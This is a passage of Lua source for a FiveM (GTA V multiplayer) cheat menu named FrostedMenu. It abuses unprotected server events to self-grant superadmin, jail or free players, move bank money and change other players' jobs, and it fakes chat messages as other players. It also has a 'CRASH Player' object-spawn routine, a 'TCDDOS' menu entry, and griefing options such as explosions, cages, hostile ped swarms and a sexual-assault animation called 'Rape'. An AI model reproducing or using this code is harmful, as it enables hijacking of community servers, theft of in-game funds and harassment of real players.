                    elseif dE.id == 'paint' then
                        if FrostedMenu.MenuButton('~h~~p~>~s~ Primary Paint', 'primary') then
                        elseif FrostedMenu.MenuButton('~h~~p~>~s~ Secondary Paint', 'secondary') then
                        elseif FrostedMenu.MenuButton('~h~~p~>~s~ Wheel Paint', 'rimpaint') then
                        end
                        FrostedMenu.Display()
                    else
                        local az = checkValidVehicleMods(dE.id)
                        for i, dL in pairs(az) do
                            for dM, dN in pairs(bp) do
                                if dM == dE.name and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
                                    price = 'Not Installed'
                                elseif dM == dE.name and bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    price = 'Previewing'
                                elseif dM == dE.name and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    price = 'Installed'
                                end
                            end
                            if dL.menuName == '~h~~b~Stock' then
                            end
                            if dE.name == 'Horns' then
                                for dO, dP in pairs(bp) do
                                    if dP == ci - 1 then
                                        dL.menuName = dO
                                    end
                                end
                            end
                            if dL.menuName == 'NULL' then
                                dL.menuName = 'unknown'
                            end
                            if FrostedMenu.Button(dL.menuName) then
                                if not bg then
                                    bi = dE.id
                                    bh = GetVehicleMod(veh, dE.id)
                                    bg = true
                                    if dL.data.realIndex == -1 then
                                        bk = 'rm'
                                        RemoveVehicleMod(veh, dL.data.modid)
                                        bg = false
                                        bi = -1
                                        bh = -1
                                        bk = false
                                    else
                                        bk = false
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                    end
                                elseif bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    bg = false
                                    bi = -1
                                    bh = -1
                                    bk = false
                                    if dL.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dL.data.modid)
                                    else
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                    end
                                elseif bg and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
                                    if dL.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dL.data.modid)
                                        bg = false
                                        bi = -1
                                        bh = -1
                                        bk = false
                                    else
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                        bg = true
                                    end
                                end
                            end
                        end
                        FrostedMenu.Display()
                    end
                end
            end
            for i, dE in pairs(bm) do
                if FrostedMenu.IsMenuOpened(dE.id) then
                    if GetVehicleMod(veh, dE.id) == 0 then
                        pricestock = 'Not Installed'
                        price1 = 'Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 1 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 2 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 3 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Installed'
                    elseif GetVehicleMod(veh, dE.id) == -1 then
                        pricestock = 'Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    end
                    if FrostedMenu.Button('Stock ' .. dE.name, pricestock) then
                        SetVehicleMod(veh, dE.id, -1)
                    elseif FrostedMenu.Button(dE.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, dE.id, 0)
                    elseif FrostedMenu.Button(dE.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, dE.id, 1)
                    elseif FrostedMenu.Button(dE.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, dE.id, 2)
                    elseif dE.id ~= 13 and dE.id ~= 12 and FrostedMenu.Button(dE.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, dE.id, 3)
                    end
                    FrostedMenu.Display()
                end
            end
            if FrostedMenu.IsMenuOpened('FrostedFlakes') then
                local dQ = PlayerId(-1)
                local bH = GetPlayerName(dQ)
                local random = math.random(1, 10)
                local text = nil
                if random == 1 then
                    text = "Yeah, Frosted Flakes, all on my wrist!"
                elseif random == 2 then
                    text = "Pull out the strap, surprise me!"
                elseif random == 3 then
                    text = "Watch out the dime, it's blind me!"
                elseif random == 4 then
                    text = "Uh, patty cake, your trap house a lick!"
                elseif random == 5 then
                    text = "What you thought I done did, I done it!"
                elseif random == 6 then
                    text = "Don't stop, 'cause the money keep comin'"
                elseif random == 7 then
                    text = "Uh, I'm countin'"
                elseif random == 8 then
                    text = "I bought a estate, no cappin' on this"
                elseif random == 9 then
                    text = "Yeah, I'm rare like steak on the plate"
                elseif random == 10 then
                    text = "I'm breakin' it up into ounces"
                end
                av("~o~¦ ~w~"..text, false)
                av('~o~¦ ~w~lilabyte#0501 x b00mek#3074', false)
                if FrostedMenu.MenuButton('~h~~p~>~o~ Player Menu', 'SelfMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Global Menu', 'BytemenuA') then
				elseif FrostedMenu.MenuButton('~h~~p~>~s~ b00m things', 'B00mmenuA') then
				elseif FrostedMenu.MenuButton('~h~~p~>~s~ Online Menu', 'OnlinePlayerMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Teleport Menu', 'TeleportMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Vehicle Menu', 'VehicleMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Weapon Menu', 'WeaponMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ TCDDOS', 'LuaMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Advanced', 'AdvM') then
                elseif FrostedMenu.MenuButton('~h~~p~> ~p~Credits', 'crds') then
                end
                FrostedMenu.Display()
			elseif FrostedMenu.IsMenuOpened('BytemenuA') then
				if FrostedMenu.Button('~h~~o~Bikini ~p~Bottom') then
					CreateBikiniBottom()
				end
				
				 FrostedMenu.Display()
			elseif FrostedMenu.IsMenuOpened('B00mmenuA') then
				if FrostedMenu.Button('~h~~o~Set ~p~Model') then
					local model = KeyboardInput('Type model name', '', 30)
						RequestModel(GetHashKey(model)) 
						Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						else ShowInfo("~r~Model not recognized")
				end
			elseif FrostedMenu.Button('~h~~o~Daj ~p~Admina') then
					TriggerEvent("es:addGroup", "superadmin", cameltoe )
					TriggerClientEvent('es_admin:setGroup', cameltoe, "superadmin")
					TriggerEvent("es:setPlayerData", cameltoe, "group", "superadmin")
				end
				
				FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('SelfMenu') then
                if
                    FrostedMenu.CheckBox(
                        '~h~~g~Godmode',
                        Godmode,
                        function(dR)
                            Godmode = dR
                        end
                    )
                 then
                elseif FrostedMenu.Button('~h~~y~Semi ~g~Godmode') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(-1),
                        GetPedBoneIndex(GetPlayerPed(-1), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~g~Player Visible',
                        d4,
                        function(dR)
                            d4 = dR
                        end
                    )
                 then
                elseif FrostedMenu.Button('~h~~r~Suicide') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif FrostedMenu.Button('~h~~g~ESX~s~ Revive Yourself~s~') then
                    TriggerEvent('esx_ambulancejob:revive')
                elseif FrostedMenu.Button('~h~~g~Heal/Revive') then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif FrostedMenu.Button('~h~~b~Give Armour') then
                    SetPedArmour(PlayerPedId(-1), 200)
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Infinite Stamina',
                        InfStamina,
                        function(dR)
                            InfStamina = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Thermal ~o~Vision',
                        bTherm,
                        function(bTherm)
                        end
                    )
                 then
                    therm = not therm
                    bTherm = therm
                    SetSeethrough(therm)
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Fast Run',
                        fastrun,
                        function(dR)
                            fastrun = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Super Jump',
                        SuperJump,
                        function(dR)
                            SuperJump = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Noclip',
                        Noclip,
                        function(dR)
                            Noclip = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('OnlinePlayerMenu') then
                for i = 0, 128 do
                    if
                        NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and
                            FrostedMenu.MenuButton(
                                GetPlayerName(i) ..
                                    ' ~p~[' ..
                                        GetPlayerServerId(i) ..
                                            ']~s~ ~y~[' ..
                                                i ..
                                                    ']~s~ ' ..
                                                        (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~h~~r~DEAD' or
                                                            '~h~~g~ALIVE'),
                                'PlayerOptionsMenu'
                            )
                     then
                        SelectedPlayer = i
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('PlayerOptionsMenu') then
                FrostedMenu.SetSubTitle('PlayerOptionsMenu', 'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']')
                if FrostedMenu.MenuButton('~h~~p~>~s~ ESX Triggers', 'ESXTriggerini') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ESX Jobs', 'ESXJobs2') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ VRP Triggers', 'VRPPlayerTriggers') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Troll Menu', 'Trollmenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Byte-menu', 'Bytemenu') then
                elseif FrostedMenu.Button('~h~Spectate', cC and '~g~[SPECTATING]') then
                    SpectatePlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~~r~Semi GOD ~s~Player') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif FrostedMenu.Button('~h~~g~Heal ~s~Player') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif FrostedMenu.Button('~h~~b~Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif FrostedMenu.Button('~h~~b~FULL Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
                elseif FrostedMenu.Button('~h~Teleport To') then
                    if cO then
                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                        if confirm == 'y' then
                            local Entity =
                                IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                                PlayerPedId(-1)
                            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                        elseif confirm == 'n' then
                            av('~h~~b~Operation cancelled~s~.', false)
                        else
                            av('~h~~b~Invalid Confirmation~s~.', true)
                            av('~h~~b~Operation cancelled~s~.', false)
                        end
                    else
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    end
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Freeze Player',
                        freezeplayer,
                        function(dR)
                            freezeplayer = dR
                        end
                    )
                 then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Give Single Weapon', 'GiveSingleWeaponPlayer') then
                elseif FrostedMenu.Button('~h~Give ~r~All Weapons') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif FrostedMenu.Button('~h~Remove ~r~All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif FrostedMenu.Button('~h~Give ~r~Vehicle') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
                    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
                        RequestModel(cb)
                        while not HasModelLoaded(cb) do
                            Citizen.Wait(0)
                        end
                        local veh =
                            CreateVehicle(GetHashKey(cb), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
                    else
                        av('~b~Model is not valid!', true)
                    end
                elseif FrostedMenu.Button('~h~Send To ~r~Jail') then
                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 5000, 'Jailed')
                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, 'Jailed')
                elseif FrostedMenu.Button('~h~~g~Evade ~s~From Jail') then
                    local dY = SelectedPlayer
                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(dY), 0, 'escaperino')
                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(dY), 0)
                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(dY), 0)
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(dY), 0, 'escaperino')
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXTriggerini') then
                if FrostedMenu.Button('~h~~g~Revive Player') then
                    local ax = GetPlayerPed(SelectedPlayer)
                    local bK = GetEntityCoords(ax)
                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    local dZ = {
                        x = ESX.Math.Round(bK.x, 1),
                        y = ESX.Math.Round(bK.y, 1),
                        z = ESX.Math.Round(bK.z, 1)
                    }
                    RespawnPed(ax, dZ, 0.0)
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
                elseif FrostedMenu.Button('~h~~g~Give money to player from your wallet') then
                    local m = KeyboardInput('Enter amount of money to give', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx:giveInventoryItem',
                            GetPlayerServerId(SelectedPlayer),
                            'item_money',
                            'money',
                            m
                        )
                    end
                elseif FrostedMenu.Button('~h~~b~Handcuff Player') then
                    TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('VRPPlayerTriggers') then
                if FrostedMenu.Button('~h~Transfer money from your bank') then
                    local d_ = KeyboardInput('Enter amount of money to give', '', 100)
                    local e0 = KeyboardInput('Enter VRP PERMA ID!', '', 100)
                    if d_ ~= '' then
                        local di = GetPlayerServerId(PlayerId())
                        TriggerEvent('bank:transfer', di, GetPlayerServerId(SelectedPlayer), d_)
                        TriggerServerEvent('bank:transfer', e0, d_)
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXJobs2') then
                if FrostedMenu.Button('~h~Set Unemployed') then
                    TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(SelectedPlayer))
                    UnemployedPlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~Set ~b~Police ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'police', 3)
                    PolicePlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~Set ~o~Mecano ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'mecano', 3)
                    MecanoPlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~Set ~y~Taxi ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'taxi', 3)
                    TaxiPlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~Set ~r~Ambulance ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'ambulance', 3)
                    AmbulancePlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~Set ~g~Real Estate ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'realestateagent', 3)
                    RealEstateAgentPlayer(SelectedPlayer)
                elseif FrostedMenu.Button('~h~Set ~r~Car ~b~Dealer ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'cardealer', 3)
                    CarDealerPlayer(SelectedPlayer)
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('Bytemenu') then
                if FrostedMenu.Button('~h~P~b~i~r~l~g~k~p~a ~w~N~o~o~g~z~r~n~b~a') then
                    print("Get Byted Bitch!")
                    local ped = GetPlayerPed(SelectedPlayer)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local forwardx = GetEntityForwardX(ped)
                    local forwardy = GetEntityForwardY(ped)
                    local prop = CreateObject(GetHashKey("p_ld_soc_ball_01"), coords.x, coords.y, coords.z + 1, 180, true, true, true);
                    SetEntityLodDist(prop, 500)
                    SetEntityDynamic(prop, true)
                    SetEntityRecordsCollisions(prop, true)
                    SetEntityHasGravity(prop, true)
                    FreezeEntityPosition(prop, false)
                    SetEntityVelocity(prop, 0, 0, 0)
                elseif FrostedMenu.Button('~h~~p~Byteeeeee!') then
					print("Get Byted Bitch!")
                    local ped = GetPlayerPed(SelectedPlayer)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local forwardx = GetEntityForwardX(ped)
                    local forwardy = GetEntityForwardY(ped)
					local droppeditem = props_byte[math.random(1, #props_byte)]
                    local prop = CreateObject(GetHashKey(droppeditem), coords.x, coords.y, coords.z + 1, 180, true, true, true);
                    SetEntityLodDist(prop, 500)
                    SetEntityDynamic(prop, true)
                    SetEntityRecordsCollisions(prop, true)
                    SetEntityHasGravity(prop, true)
                    FreezeEntityPosition(prop, false)
                    SetEntityVelocity(prop, 0, 0, 0)
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('Trollmenu') then
                if FrostedMenu.MenuButton('~h~~p~>~s~ Spawn Peds', 'SpawnPeds') then
                elseif FrostedMenu.Button('~h~~r~Fake ~s~Chat Message') then
                    local e1 = KeyboardInput('Enter message to send', '', 100)
                    local e2 = GetPlayerName(SelectedPlayer)
                    if e1 then
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            e2,
                            {
                                0,
                                0x99,
                                255
                            },
                            e1
                        )
                    end
                elseif FrostedMenu.Button('~h~~r~Kick ~s~From Vehicle') then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif FrostedMenu.Button('~h~~y~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif FrostedMenu.Button('~h~~r~Launch ~s~his car') then
                    if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
                        local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer))
                        local e5 = CreatePed(5, 68070371, e3, e4, true)
                        local e6 = CreateVehicle(GetHashKey('adder'), e3, e4, true, false)
                        SetPedIntoVehicle(e5, e6, -1)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif FrostedMenu.Button('~h~~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif FrostedMenu.Button('~h~~r~Explode') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
                elseif FrostedMenu.Button('~h~~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif FrostedMenu.Button('~h~~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif FrostedMenu.Button('~h~~r~Hamburgher ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif FrostedMenu.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif FrostedMenu.Button('~h~~r~Snowball troll ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = GetHashKey(ee)
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                true,
                                true
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    true,
                                    true
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif FrostedMenu.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                    local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local ek = {
                        0x9CF21E0F,
                        0x34315488,
                        0x6A27FEB1,
                        0xCB2ACC8,
                        0xC6899CDE,
                        0xD14B5BA3,
                        0xD9F4474C,
                        0x32A9996C,
                        0x69D4F974,
                        0xCAFC1EC3,
                        0x79B41171,
                        0x1075651,
                        0xC07792D4,
                        0x781E451D,
                        0x762657C6,
                        0xC2E75A21,
                        0xC3C00861,
                        0x81FB3FF0,
                        0x45EF7804,
                        0xE65EC0E4,
                        0xE764D794,
                        0xFBF7D21F,
                        0xE1AEB708,
                        0xA5E3D471,
                        0xD971BBAE,
                        0xCF7A9A9D,
                        0xC2CC99D8,
                        0x8FB233A4,
                        0x24E08E1F,
                        0x337B2B54,
                        0xB9402F87,
                        0x4F2526DA
                    }
                    for i = 1, #ek do
                        local a = CreateObject(ek[i], ej, true, true, true)
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('SpawnPeds') then
